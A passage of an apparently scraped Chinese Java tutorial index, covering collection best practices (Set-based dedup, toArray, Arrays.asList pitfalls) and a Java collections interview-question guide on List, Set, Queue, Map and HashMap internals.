元素唯一的特性，可以快速对一个集合进行去重操作，避免使用 List 的 contains() 进行遍历去重或者判断包含操作。\n 这里我们以 HashSet 和 ArrayList 为例说明。\n// Set 去重代码示例 public static \u0026lt;T\u0026gt; Set\u0026lt;T\u0026gt; removeDuplicateBySet(List\u0026lt;T\u0026gt; data) { if (CollectionUtils.isEmpty(data)) { return new HashSet\u0026lt;\u0026gt;(); } return new HashSet\u0026lt;\u0026gt;(data); } // List 去重代码示例 public static \u0026lt;T\u0026gt; List\u0026lt;T\u0026gt; removeDuplicateByList(List\u0026lt;T\u0026gt; data) { if (CollectionUtils.isEmpty(data)) { return new ArrayList\u0026lt;\u0026gt;(); } List\u0026lt;T\u0026gt; result = new ArrayList\u0026lt;\u0026gt;(data.size()); for (T current : data) { if (!result.contains(current)) { result.add(current); } } return result; } 两者的核心差别在于 contains() 方法的实现。\nHashSet 的 contains() 方法底部依赖的 HashMap 的 containsKey() 方法，时间复杂度接近于 O（1）（没有出现哈希冲突的时候为 O（1））。\nprivate transient HashMap\u0026lt;E,Object\u0026gt; map; public boolean contains(Object o) { return map.containsKey(o); } 我们有 N 个元素插入进 Set 中，那时间复杂度就接近是 O (n)。\nArrayList 的 contains() 方法是通过遍历所有元素的方法来做的，时间复杂度接近是 O(n)。\npublic boolean contains(Object o) { return indexOf(o) \u0026gt;= 0; } public int indexOf(Object o) { if (o == null) { for (int i = 0; i \u0026lt; size; i++) if (elementData[i]==null) return i; } else { for (int i = 0; i \u0026lt; size; i++) if (o.equals(elementData[i])) return i; } return -1; } 我们的 List 有 N 个元素，那时间复杂度就接近是 O (n^2)。\n集合转数组    《阿里巴巴 Java 开发手册》的描述如下：\n 使用集合转数组的方法，必须使用集合的 toArray(T[] array)，传入的是类型完全一致、长度为 0 的空数组。\n toArray(T[] array) 方法的参数是一个泛型数组，如果 toArray 方法中没有传递任何参数的话返回的是 Object类 型数组。\nString [] s= new String[]{ \u0026#34;dog\u0026#34;, \u0026#34;lazy\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;over\u0026#34;, \u0026#34;jumps\u0026#34;, \u0026#34;fox\u0026#34;, \u0026#34;brown\u0026#34;, \u0026#34;quick\u0026#34;, \u0026#34;A\u0026#34; }; List\u0026lt;String\u0026gt; list = Arrays.asList(s); Collections.reverse(list); //没有指定类型的话会报错 s=list.toArray(new String[0]); 由于 JVM 优化，new String[0]作为Collection.toArray()方法的参数现在使用更好，new String[0]就是起一个模板的作用，指定了返回数组的类型，0 是为了节省空间，因为它只是为了说明返回的类型。详见：https://shipilev.net/blog/2016/arrays-wisdom-ancients/\n数组转集合    《阿里巴巴 Java 开发手册》的描述如下：\n 使用工具类 Arrays.asList() 把数组转换成集合时，不能使用其修改集合相关的方法， 它的 add/remove/clear 方法会抛出 UnsupportedOperationException 异常。\n 我在之前的一个项目中就遇到一个类似的坑。\nArrays.asList()在平时开发中还是比较常见的，我们可以使用它将一个数组转换为一个 List 集合。\nString[] myArray = {\u0026#34;Apple\u0026#34;, \u0026#34;Banana\u0026#34;, \u0026#34;Orange\u0026#34;}; List\u0026lt;String\u0026gt; myList = Arrays.asList(myArray); //上面两个语句等价于下面一条语句 List\u0026lt;String\u0026gt; myList = Arrays.asList(\u0026#34;Apple\u0026#34;,\u0026#34;Banana\u0026#34;, \u0026#34;Orange\u0026#34;); JDK 源码对于这个方法的说明：\n/** *返回由指定数组支持的固定大小的列表。此方法作为基于数组和基于集合的API之间的桥梁， * 与 Collection.toArray()结合使用。返回的List是可序列化并实现RandomAccess接口。 */ public static \u0026lt;T\u0026gt; List\u0026lt;T\u0026gt; asList(T... a) { return new ArrayList\u0026lt;\u0026gt;(a); } 下面我们来总结一下使用注意事项。\n1、Arrays.asList()是泛型方法，传递的数组必须是对象数组，而不是基本类型。\nint[] myArray = {1, 2, 3}; List myList = Arrays.asList(myArray); System.out.println(myList.size());//1 System.out.println(myList.get(0));//数组地址值 System.out.println(myList.get(1));//报错：ArrayIndexOutOfBoundsException int[] array = (int[]) myList.get(0); System.out.println(array[0]);//1 当传入一个原生数据类型数组时，Arrays.asList() 的真正得到的参数就不是数组中的元素，而是数组对象本身！此时 List 的唯一元素就是这个数组，这也就解释了上面的代码。\n我们使用包装类型数组就可以解决这个问题。\nInteger[] myArray = {1, 2, 3}; 2、使用集合的修改方法: add()、remove()、clear()会抛出异常。\nList myList = Arrays.asList(1, 2, 3); myList.add(4);//运行时报错：UnsupportedOperationException myList.remove(1);//运行时报错：UnsupportedOperationException myList.clear();//运行时报错：UnsupportedOperationException Arrays.asList() 方法返回的并不是 java.util.ArrayList ，而是 java.util.Arrays 的一个内部类,这个内部类并没有实现集合的修改方法或者说并没有重写这些方法。\nList myList = Arrays.asList(1, 2, 3); System.out.println(myList.getClass());//class java.util.Arrays$ArrayList 下图是 java.util.Arrays$ArrayList 的简易源码，我们可以看到这个类重写的方法有哪些。\nprivate static class ArrayList\u0026lt;E\u0026gt; extends AbstractList\u0026lt;E\u0026gt; implements RandomAccess, java.io.Serializable { ... @Override public E get(int index) { ... } @Override public E set(int index, E element) { ... } @Override public int indexOf(Object o) { ... } @Override public boolean contains(Object o) { ... } @Override public void forEach(Consumer\u0026lt;? super E\u0026gt; action) { ... } @Override public void replaceAll(UnaryOperator\u0026lt;E\u0026gt; operator) { ... } @Override public void sort(Comparator\u0026lt;? super E\u0026gt; c) { ... } } 我们再看一下java.util.AbstractList的 add/remove/clear 方法就知道为什么会抛出 UnsupportedOperationException 了。\npublic E remove(int index) { throw new UnsupportedOperationException(); } public boolean add(E e) { add(size(), e); return true; } public void add(int index, E element) { throw new UnsupportedOperationException(); } public void clear() { removeRange(0, size()); } protected void removeRange(int fromIndex, int toIndex) { ListIterator\u0026lt;E\u0026gt; it = listIterator(fromIndex); for (int i=0, n=toIndex-fromIndex; i\u0026lt;n; i++) { it.next(); it.remove(); } } 那我们如何正确的将数组转换为 ArrayList ?\n1、手动实现工具类\n//JDK1.5+ static \u0026lt;T\u0026gt; List\u0026lt;T\u0026gt; arrayToList(final T[] array) { final List\u0026lt;T\u0026gt; l = new ArrayList\u0026lt;T\u0026gt;(array.length); for (final T s : array) { l.add(s); } return l; } Integer [] myArray = { 1, 2, 3 }; System.out.println(arrayToList(myArray).getClass());//class java.util.ArrayList 2、最简便的方法\nList list = new ArrayList\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;)) 3、使用 Java8 的 Stream(推荐)\nInteger [] myArray = { 1, 2, 3 }; List myList = Arrays.stream(myArray).collect(Collectors.toList()); //基本类型也可以实现转换（依赖boxed的装箱操作） int [] myArray2 = { 1, 2, 3 }; List myList = Arrays.stream(myArray2).boxed().collect(Collectors.toList()); 4、使用 Guava\n对于不可变集合，你可以使用ImmutableList类及其of()与copyOf()工厂方法：（参数不能为空）\nList\u0026lt;String\u0026gt; il = ImmutableList.of(\u0026#34;string\u0026#34;, \u0026#34;elements\u0026#34;); // from varargs List\u0026lt;String\u0026gt; il = ImmutableList.copyOf(aStringArray); // from array 对于可变集合，你可以使用Lists类及其newArrayList()工厂方法：\nList\u0026lt;String\u0026gt; l1 = Lists.newArrayList(anotherListOrCollection); // from collection List\u0026lt;String\u0026gt; l2 = Lists.newArrayList(aStringArray); // from array List\u0026lt;String\u0026gt; l3 = Lists.newArrayList(\u0026#34;or\u0026#34;, \u0026#34;string\u0026#34;, \u0026#34;elements\u0026#34;); // from varargs 5、使用 Apache Commons Collections\nList\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;String\u0026gt;(); CollectionUtils.addAll(list, str); 6、 使用 Java9 的 List.of()方法\nInteger[] array = {1, 2, 3}; List\u0026lt;Integer\u0026gt; list = List.of(array); "},{"id":233,"href":"/java/collection/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/","title":"Java集合框架常见面试题","parent":"collection","content":" 1. 剖析面试最常见问题之 Java 集合框架  1.1. 集合概述  1.1.1. Java 集合概览 1.1.2. 说说 List, Set, Queue, Map 四者的区别？ 1.1.3. 集合框架底层数据结构总结  1.1.3.1. List 1.1.3.2. Set 1.1.3.3 Queue 1.1.3.4. Map   1.1.4. 如何选用集合? 1.1.5. 为什么要使用集合？   1.2. Collection 子接口之 List  1.2.1. Arraylist 和 Vector 的区别? 1.2.2. Arraylist 与 LinkedList 区别?  1.2.2.1. 补充内容:双向链表和双向循环链表 1.2.2.2. 补充内容:RandomAccess 接口   1.2.3. 说一说 ArrayList 的扩容机制吧   1.3. Collection 子接口之 Set  1.3.1. comparable 和 Comparator 的区别  1.3.1.1. Comparator 定制排序 1.3.1.2. 重写 compareTo 方法实现按年龄来排序   1.3.2. 无序性和不可重复性的含义是什么 1.3.3. 比较 HashSet、LinkedHashSet 和 TreeSet 三者的异同   1.4 Collection 子接口之 Queue  1.4.1 Queue 与 Deque 的区别 1.4.2 ArrayDeque 与 LinkedList 的区别 1.4.3 说一说 PriorityQueue   1.5. Map 接口  1.5.1. HashMap 和 Hashtable 的区别 1.5.2. HashMap 和 HashSet 区别 1.5.3. HashMap 和 TreeMap 区别 1.5.4. HashSet 如何检查重复 1.5.5. HashMap 的底层实现  1.5.5.1. JDK1.8 之前 1.5.5.2. JDK1.8 之后   1.5.6. HashMap 的长度为什么是 2 的幂次方 1.5.7. HashMap 多线程操作导致死循环问题 1.5.8. HashMap 有哪几种常见的遍历方式? 1.5.9. ConcurrentHashMap 和 Hashtable 的区别 1.5.10. ConcurrentHashMap 线程安全的具体实现方式/底层具体实现  1.5.10.1. JDK1.7（上面有示意图） 1.5.10.2. JDK1.8 （上面有示意图）     1.6. Collections 工具类  1.6.1. 排序操作 1.6.2. 查找,替换操作 1.6.3. 同步控制      1. 剖析面试最常见问题之 Java 集合框架    1.1. 集合概述    1.1.1. Java 集合概览    Java 集合， 也叫作容器，主要是由两大接口派生而来：一个是 Collecton接口，主要用于存放单一元素；另一个是 Map 接口，主要用于存放键值对。对于Collection 接口，下面又有三个主要的子接口：List、Set 和 Queue。\nJava 集合框架如下图所示：\n注：图中只列举了主要的继承派生关系，并没有列举所有关系。比方省略了AbstractList, NavigableSet等抽象类以及其他的一些辅助类，如想深入了解，可自行查看源码。\n1.1.2. 说说 List, Set, Queue, Map 四者的区别？     List(对付顺序的好帮手): 存储的元素是有序的、可重复的。 Set(注重独一无二的性质): 存储的元素是无序的、不可重复的。 Queue(实现排队功能的叫号机): 按特定的排队规则来确定先后顺序，存储的元素是有序的、可重复的。 Map(用 key 来搜索的专家): 使用键值对（key-value）存储，类似于数学上的函数 y=f(x)，\u0026ldquo;x\u0026rdquo; 代表 key，\u0026ldquo;y\u0026rdquo; 代表 value，key 是无序的、不可重复的，value 是无序的、可重复的，每个键最多映射到一个值。  1.1.3. 集合框架底层数据结构总结    先来看一下 Collection 接口下面的集合。\n1.1.3.1. List     Arraylist： Object[] 数组 Vector：Object[] 数组 LinkedList： 双向链表(JDK1.6 之前为循环链表，JDK1.7 取消了循环)  1.1.3.2. Set     HashSet(无序，唯一): 基于 HashMap 实现的，底层采用 HashMap 来保存元素 LinkedHashSet: LinkedHashSet 是 HashSet 的子类，并且其内部是通过 LinkedHashMap 来实现的。有点类似于我们之前说的 LinkedHashMap 其内部是基于 HashMap 实现一样，不过还是有一点点区别的 TreeSet(有序，唯一): 红黑树(自平衡的排序二叉树)  1.1.3.3 Queue     PriorityQueue: Object[] 数组来实现二叉堆 ArrayQueue: Object[] 数组 + 双指针  再来看看 Map 接口下面的集合。\n1.1.3.4. Map     HashMap： JDK1.8 之前 HashMap 由数组+链表组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的（“拉链法”解决冲突）。JDK1.8 以后在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间 LinkedHashMap： LinkedHashMap 继承自 HashMap，所以它的底层仍然是基于拉链式散列结构即由数组和链表或红黑树组成。另外，LinkedHashMap 在上面结构的基础上，增加了一条双向链表，使得上面的结构可以保持键值对的插入顺序。同时通过对链表进行相应的操作，实现了访问顺序相关逻辑。详细可以查看：《LinkedHashMap 源码详细分析（JDK1.8）》 Hashtable： 数组+链表组成的，数组是 Hashtable 的主体，链表则是主要为了解决哈希冲突而存在的 TreeMap： 红黑树（自平衡的排序二叉树）  1.1.4. 如何选用集合?    主要根据集合的特点来选用，比如我们需要根据键值获取到元素值时就选用 Map 接口下的集合，需要排序时选择 TreeMap,不需要排序时就选择 HashMap,需要保证线程安全就选用 ConcurrentHashMap。\n当我们只需要存放元素值时，就选择实现Collection 接口的集合，需要保证元素唯一时选择实现 Set 接口的集合比如 TreeSet 或 HashSet，不需要就选择实现 List 接口的比如 ArrayList 或 LinkedList，然后再根据实现这些接口的集合的特点来选用。\n1.1.5. 为什么要使用集合？    当我们需要保存一组类型相同的数据的时候，我们应该是用一个容器来保存，这个容器就是数组，但是，使用数组存储对象具有一定的弊端， 因为我们在实际开发中，存储的数据的类型是多种多样的，于是，就出现了“集合”，集合同样也是用来存储多个数据的。\n数组的缺点是一旦声明之后，长度就不可变了；同时，声明数组时的数据类型也决定了该数组存储的数据的类型；而且，数组存储的数据是有序的、可重复的，特点单一。 但是集合提高了数据存储的灵活性，Java 集合不仅可以用来存储不同类型不同数量的对象，还可以保存具有映射关系的数据。\n1.2. Collection 子接口之 List    1.2.1. Arraylist 和 Vector 的区别?     ArrayList 是 List 的主要实现类，底层使用 Object[ ]存储，适用于频繁的查找工作，线程不安全 ； Vector 是 List 的古老实现类，底层使用Object[ ] 存储，线程安全的。  1.2.2. Arraylist 与 LinkedList 区别?     是否保证线程安全： ArrayList 和 LinkedList 都是不同步的，也就是不保证线程安全； 底层数据结构： Arraylist 底层使用的是 Object 数组；LinkedList 底层使用的是 双向链表 数据结构（JDK1.6 之前为循环链表，JDK1.7 取消了循环。注意双向链表和双向循环链表的区别，下面有介绍到！） 插入和删除是否受元素位置的影响：  ArrayList 采用数组存储，所以插入和删除元素的时间复杂度受元素位置的影响。 比如：执行add(E e)方法的时候， ArrayList 会默认在将指定的元素追加到此列表的末尾，这种情况时间复杂度就是 O(1)。但是如果要在指定位置 i 插入和删除元素的话（add(int index, E element)）时间复杂度就为 O(n-i)。因为在进行上述操作的时候集合中第 i 和第 i 个元素之后的(n-i)个元素都要执行向后位/向前移一位的操作。 LinkedList 采用链表存储，所以，如果是在头尾插入或者删除元素不受元素位置的影响（add(E e)、addFirst(E e)、addLast(E e)、removeFirst() 、 removeLast()），近似 O(1)，如果是要在指定位置 i 插入和删除元素的话（add(int index, E element)，remove(Object o)） 时间复杂度近似为 O(n) ，因为需要先移动到指定位置再插入。   是否支持快速随机访问： LinkedList 不支持高效的随机元素访问，而 ArrayList 支持。快速随机访问就是通过元素的序号快速获取元素对象(对应于get(int index)方法)。 内存空间占用： ArrayList 的空 间浪费主要体现在在 list 列表的结尾会预留一定的容量空间，而 LinkedList 的空间花费则体现在它的每一个元素都需要消耗比 ArrayList 更多的空间（因为要存放直接后继和直接前驱以及数据）。  1.2.2.1. 补充内容:双向链表和双向循环链表    双向链表： 包含两个指针，一个 prev 指向前一个节点，一个 next 指向后一个节点。\n 另外推荐一篇把双向链表讲清楚的文章：https://juejin.cn/post/6844903648154271757\n 双向循环链表： 最后一个节点的 next 指向 head，而 head 的 prev 指向最后一个节点，构成一个环。\n1.2.2.2. 补充内容:RandomAccess 接口    public interface RandomAccess { } 查看源码我们发现实际上 RandomAccess 接口中什么都没有定义。所以，在我看来 RandomAccess 接口不过是一个标识罢了。标识什么？ 标识实现这个接口的类具有随机访问功能。\n在 binarySearch（) 方法中，它要判断传入的 list 是否 RamdomAccess 的实例，如果是，调用indexedBinarySearch()方法，如果不是，那么调用iteratorBinarySearch()方法\npublic static \u0026lt;T\u0026gt; int binarySearch(List\u0026lt;? extends Comparable\u0026lt;? super T\u0026gt;\u0026gt; list, T key) { if (list instanceof RandomAccess || list.size()\u0026lt;BINARYSEARCH_THRESHOLD) return Collections.indexedBinarySearch(list, key); else return Collections.iteratorBinarySearch(list, key); } ArrayList 实现了 RandomAccess 接口， 而 LinkedList 没有实现。为什么呢？我觉得还是和底层数据结构有关！ArrayList 底层是数组，而 LinkedList 底层是链表。数组天然支持随机访问，时间复杂度为 O(1)，所以称为快速随机访问。链表需要遍历到特定位置才能访问特定位置的元素，时间复杂度为 O(n)，所以不支持快速随机访问。，ArrayList 实现了 RandomAccess 接口，就表明了他具有快速随机访问功能。 RandomAccess 接口只是标识，并不是说 ArrayList 实现 RandomAccess 接口才具有快速随机访问功能的！\n1.2.3. 说一说 ArrayList 的扩容机制吧    详见笔主的这篇文章:通过源码一步一步分析 ArrayList 扩容机制\n1.3. Collection 子接口之 Set    1.3.1. comparable 和 Comparator 的区别     comparable 接口实际上是出自java.lang包 它有一个 compareTo(Object obj)方法用来排序 comparator接口实际上是出自 java.util 包它有一个compare(Object obj1, Object obj2)方法用来排序  一般我们需要对一个集合使用自定义排序时，我们就要重写compareTo()方法或compare()方法，当我们需要对某一个集合实现两种排序方式，比如一个 song 对象中的歌名和歌手名分别采用一种排序方法的话，我们可以重写compareTo()方法和使用自制的Comparator方法或者以两个 Comparator 来实现歌名排序和歌星名排序，第二种代表我们只能使用两个参数版的 Collections.sort().\n1.3.1.1. Comparator 定制排序    ArrayList\u0026lt;Integer\u0026gt; arrayList = new ArrayList\u0026lt;Integer\u0026gt;(); arrayList.add(-1); arrayList.add(3); arrayList.add(3); arrayList.add(-5); arrayList.add(7); arrayList.add(4); arrayList.add(-9); arrayList.add(-7); System.out.println(\u0026#34;原始数组:\u0026#34;); System.out.println(arrayList); // void reverse(List list)：反转  Collections.reverse(arrayList); System.out.println(\u0026#34;Collections.reverse(arrayList):\u0026#34;); System.out.println(arrayList); // void sort(List list),按自然排序的升序排序  Collections.sort(arrayList); System.out.println(\u0026#34;Collections.sort(arrayList):\u0026#34;); System.out.println(arrayList); // 定制排序的用法  Collections.sort(arrayList, new Comparator\u0026lt;Integer\u0026gt;() { @Override public int compare(Integer o1, Integer o2) { return o2.compareTo(o1); } }); System.out.println(\u0026#34;定制排序后：\u0026#34;); System.out.println(arrayList); Output:\n原始数组: [-1, 3, 3, -5, 7, 4, -9, -7] Collections.reverse(arrayList): [-7, -9, 4, 7, -5, 3, 3, -1] Collections.sort(arrayList): [-9, -7, -5, -1, 3, 3, 4, 7] 定制排序后： [7, 4, 3, 3, -1, -5, -7, -9] 1.3.1.2. 重写 compareTo 方法实现按年龄来排序    // person对象没有实现Comparable接口，所以必须实现，这样才不会出错，才可以使treemap中的数据按顺序排列 // 前面一个例子的String类已经默认实现了Comparable接口，详细可以查看String类的API文档，另外其他 // 像Integer类等都已经实现了Comparable接口，所以不需要另外实现了 public class Person implements Comparable\u0026lt;Person\u0026gt; { private String name; private int age; public Person(String name, int age) { super(); this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } /** * T重写compareTo方法实现按年龄来排序 */ @Override public int compareTo(Person o) { if (this.age \u0026gt; o.getAge()) { return 1; } if (this.age \u0026lt; o.getAge()) { return -1; } return 0; } } public static void main(String[] args) { TreeMap\u0026lt;Person, String\u0026gt; pdata = new TreeMap\u0026lt;Person, String\u0026gt;(); pdata.put(new Person(\u0026#34;张三\u0026#34;, 30), \u0026#34;zhangsan\u0026#34;); pdata.put(new Person(\u0026#34;李四\u0026#34;, 20), \u0026#34;lisi\u0026#34;); pdata.put(new Person(\u0026#34;王五\u0026#34;, 10), \u0026#34;wangwu\u0026#34;); pdata.put(new Person(\u0026#34;小红\u0026#34;, 5), \u0026#34;xiaohong\u0026#34;); // 得到key的值的同时得到key所对应的值  Set\u0026lt;Person\u0026gt; keys = pdata.keySet(); for (Person key : keys) { System.out.println(key.getAge() + \u0026#34;-\u0026#34; + key.getName()); } } Output：\n5-小红 10-王五 20-李四 30-张三 1.3.2. 无序性和不可重复性的含义是什么    1、什么是无序性？无序性不等于随机性 ，无序性是指存储的数据在底层数组中并非按照数组索引的顺序添加 ，而是根据数据的哈希值决定的。\n2、什么是不可重复性？不可重复性是指添加的元素按照 equals()判断时 ，返回 false，需要同时重写 equals()方法和 HashCode()方法。\n1.3.3. 比较 HashSet、LinkedHashSet 和 TreeSet 三者的异同    HashSet 是 Set 接口的主要实现类 ，HashSet 的底层是 HashMap，线程不安全的，可以存储 null 值；\nLinkedHashSet 是 HashSet 的子类，能够按照添加的顺序遍历；\nTreeSet 底层使用红黑树，元素是有序的，排序的方式有自然排序和定制排序。\n1.4 Collection 子接口之 Queue    1.4.1 Queue 与 Deque 的区别    Queue 是单端队列，只能从一端插入元素，另一端删除元素，实现上一般遵循 先进先出（FIFO） 规则。\nQueue 扩展了 Collection 的接口，根据 因为容量问题而导致操作失败后处理方式的不同 可以分为两类方法: 一种在操作失败后会抛出异常，另一种则会返回特殊值。\n   Queue 接口 抛出异常 返回特殊值     插入队尾 add(E e) offer(E e)   删除队首 remove() poll()   查询队首元素 element() peek()    Deque 是双端队列，在队列的两端均可以插入或删除元素。\nDeque 扩展了 Queue 的接口, 增加了在队首和队尾进行插入和删除的方法，同样根据失败后处理方式的不同分为两类：\n   Deque 接口 抛出异常 返回特殊值     插入队首 addFirst(E e) offerFirst(E e)   插入队尾 addLast(E e) offerLast(E e)   删除队首 removeFirst() pollFirst()   删除队尾 removeLast() pollLast()   查询队首元素 getFirst() peekFirst()   查询队尾元素 getLast() peekLast()    事实上，Deque 还提供有 push() 和 pop() 等其他方法，可用于模拟栈。\n1.4.2 ArrayDeque 与 LinkedList 的区别    ArrayDeque 和 LinkedList 都实现了 Deque 接口，两者都具有队列的功能，但两者有什么区别呢？\n  ArrayDeque 是基于可变长的数组和双指针来实现，而 LinkedList 则通过链表来实现。\n  ArrayDeque 不支持存储 NULL 数据，但 LinkedList 支持。\n  ArrayDeque 是在 JDK1.6 才被引入的，而LinkedList 早在 JDK1.2 时就已经存在。\n  ArrayDeque 插入时可能存在扩容过程, 不过均摊后的插入操作依然为 O(1)。虽然 LinkedList 不需要扩容，但是每次插入数据时均需要申请新的堆空间，均摊性能相比更慢。\n  从性能的角度上，选用 ArrayDeque 来实现队列要比 LinkedList 更好。此外，ArrayDeque 也可以用于实现栈。\n1.4.3 说一说 PriorityQueue    PriorityQueue 是在 JDK1.5 中被引入的, 其与 Queue 的区别在于元素出队顺序是与优先级相关的，即总是优先级最高的元素先出队。\n这里列举其相关的一些要点：\n PriorityQueue 利用了二叉堆的数据结构来实现的，底层使用可变长的数组来存储数据 PriorityQueue 通过堆元素的上浮和下沉，实现了在 O(logn) 的时间复杂度内插入元素和删除堆顶元素。 PriorityQueue 是非线程安全的，且不支持存储 NULL 和 non-comparable 的对象。 PriorityQueue 默认是小顶堆，但可以接收一个 Comparator 作为构造参数，从而来自定义元素优先级的先后。  PriorityQueue 在面试中可能更多的会出现在手撕算法的时候，典型例题包括堆排序、求第K大的数、带权图的遍历等，所以需要会熟练使用才行。\n1.5. Map 接口    1.5.1. HashMap 和 Hashtable 的区别     线程是否安全： HashMap 是非线程安全的，Hashtable 是线程安全的,因为 Hashtable 内部的方法基本都经过synchronized 修饰。（如果你要保证线程安全的话就使用 ConcurrentHashMap 吧！）； 效率： 因为线程安全的问题，HashMap 要比 Hashtable 效率高一点。另外，Hashtable 基本被淘汰，不要在代码中使用它； 对 Null key 和 Null value 的支持： HashMap 可以存储 null 的 key 和 value，但 null 作为键只能有一个，null 作为值可以有多个；Hashtable 不允许有 null 键和 null 值，否则会抛出 NullPointerException。 初始容量大小和每次扩充容量大小的不同 ： ① 创建时如果不指定容量初始值，Hashtable 默认的初始大小为 11，之后每次扩充，容量变为原来的 2n+1。HashMap 默认的初始化大小为 16。之后每次扩充，容量变为原来的 2 倍。② 创建时如果给定了容量初始值，那么 Hashtable 会直接使用你给定的大小，而 HashMap 会将其扩充为 2 的幂次方大小（HashMap 中的tableSizeFor()方法保证，下面给出了源代码）。也就是说 HashMap 总是使用 2 的幂作为哈希表的大小,后面会介绍到为什么是 2 的幂次方。 底层数据结构： JDK1.8 以后的 HashMap 在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间。Hashtable 没有这样的机制。  HashMap 中带有初始容量的构造函数：\npublic HashMap(int initialCapacity, float loadFactor) { if (initialCapacity \u0026lt; 0) throw new IllegalArgumentException(\u0026#34;Illegal initial capacity: \u0026#34; + initialCapacity); if (initialCapacity \u0026gt; MAXIMUM_CAPACITY) initialCapacity = MAXIMUM_CAPACITY; if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) throw new IllegalArgumentException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); this.loadFactor = loadFactor; this.threshold = tableSizeFor(initialCapacity); } public HashMap(int initialCapacity) { this(initialCapacity, DEFAULT_LOAD_FACTOR); } 下面这个方法保证了 HashMap 总是使用 2 的幂作为哈希表的大小。\n/** * Returns a power of two size for the given target capacity. */ static final int tableSizeFor(int cap) { int n = cap - 1; n |= n \u0026gt;\u0026gt;\u0026gt; 1; n |= n \u0026gt;\u0026gt;\u0026gt; 2; n |= n \u0026gt;\u0026gt;\u0026gt; 4; n |= n \u0026gt;\u0026gt;\u0026gt; 8; n |= n \u0026gt;\u0026gt;\u0026gt; 16; return (n \u0026lt; 0) ? 1 : (n \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1; } 1.5.2. HashMap 和 HashSet 区别    如果你看过 HashSet 源码的话就应该知道：HashSet 底层就是基于 HashMap 实现的。（HashSet 的源码非常非常少，因为除了 clone()、writeObject()、readObject()是 HashSet 自己不得不实现之外，其他方法都是直接调用 HashMap 中的方法。\n   HashMap HashSet     实现了 Map 接口 实现 Set 接口   存储键值对 仅存储对象   调用 put()向 map 中添加元素 调用 add()方法向 Set 中添加元素   HashMap 使用键（Key）计算 hashcode HashSet 使用成员对象来计算 hashcode 值，对于两个对象来说 hashcode 可能相同，所以equals()方法用来判断对象的相等性    1.5.3. HashMap 和 TreeMap 区别    TreeMap 和HashMap 都继承自AbstractMap ，但是需要注意的是TreeMap它还实现了NavigableMap接口和SortedMap 接口。\n实现 NavigableMap 接口让 TreeMap 有了对集合内元素的搜索的能力。\n实现SortedMap接口让 TreeMap 有了对集合中的元素根据键排序的能力。默认是按 key 的升序排序，不过我们也可以指定排序的比较器。示例代码如下：\n/** * @author shuang.kou * @createTime 2020年06月15日 17:02:00 */ public class Person { private Integer age; public Person(Integer age) { this.age = age; } public Integer getAge() { return age; } public static void main(String[] args) { TreeMap\u0026lt;Person, String\u0026gt; treeMap = new TreeMap\u0026lt;\u0026gt;(new Comparator\u0026lt;Person\u0026gt;() { @Override public int compare(Person person1, Person person2) { int num = person1.getAge() - person2.getAge(); return Integer.compare(num, 0); } }); treeMap.put(new Person(3), \u0026#34;person1\u0026#34;); treeMap.put(new Person(18), \u0026#34;person2\u0026#34;); treeMap.put(new Person(35), \u0026#34;person3\u0026#34;); treeMap.put(new Person(16), \u0026#34;person4\u0026#34;); treeMap.entrySet().stream().forEach(personStringEntry -\u0026gt; { System.out.println(personStringEntry.getValue()); }); } } 输出:\nperson1 person4 person2 person3 可以看出，TreeMap 中的元素已经是按照 Person 的 age 字段的升序来排列了。\n上面，我们是通过传入匿名内部类的方式实现的，你可以将代码替换成 Lambda 表达式实现的方式：\nTreeMap\u0026lt;Person, String\u0026gt; treeMap = new TreeMap\u0026lt;\u0026gt;((person1, person2) -\u0026gt; { int num = person1.getAge() - person2.getAge(); return Integer.compare(num, 0); }); 综上，相比于HashMap来说 TreeMap 主要多了对集合中的元素根据键排序的能力以及对集合内元素的搜索的能力。\n1.5.4. HashSet 如何检查重复    以下内容摘自我的 Java 启蒙书《Head first java》第二版：\n当你把对象加入HashSet时，HashSet 会先计算对象的hashcode值来判断对象加入的位置，同时也会与其他加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用equals()方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让加入操作成功。\n在openjdk8中，HashSet的add()方法只是简单的调用了HashMap的put()方法，并且判断了一下返回值以确保是否有重复元素。直接看一下HashSet中的源码：\n// Returns: true if this set did not already contain the specified element // 返回值：当set中没有包含add的元素时返回真 public boolean add(E e) { return map.put(e, PRESENT)==null; } 而在HashMap的putVal()方法中也能看到如下说明：\n// Returns : previous value, or null if none // 返回值：如果插入位置没有元素返回null，否则返回上一个元素 final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { ... } 也就是说，在openjdk8中，实际上无论HashSet中是否已经存在了某元素，HashSet都会直接插入，只是会在add()方法的返回值处告诉我们插入前是否存在相同元素。\nhashCode()与 equals() 的相关规定：\n 如果两个对象相等，则 hashcode 一定也是相同的 两个对象相等,对两个 equals() 方法返回 true 两个对象有相同的 hashcode 值，它们也不一定是相等的 综上，equals() 方法被覆盖过，则 hashCode() 方法也必须被覆盖 hashCode()的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）。  ==与 equals 的区别\n对于基本类型来说，== 比较的是值是否相等；\n对于引用类型来说，== 